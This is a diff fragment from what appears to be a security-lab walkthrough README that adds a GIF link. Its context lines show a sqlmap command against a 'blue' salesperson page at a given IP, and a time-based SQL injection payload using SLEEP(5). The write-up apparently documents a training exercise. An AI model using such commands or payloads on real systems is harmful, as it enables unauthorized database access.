@@ -24,6 +24,7 @@ Go to the blue website without loging in click on find a sales person, open Sqlm
 sqlmap --url https://35.224.228.84/blue/public/salesperson.php?id=4 --dbs
 Sqlmap found it vulnerable to SQL with this given syntax id=4' OR SLEEP(5) AND 'ZAWi'='ZAWi
 GIF Walkthrough:
+![sqliblue](https://user-images.githubusercontent.com/30760006/37753372-c5a18d72-2d59-11e8-80e8-74fd7e36a817.gif)
 
 
 
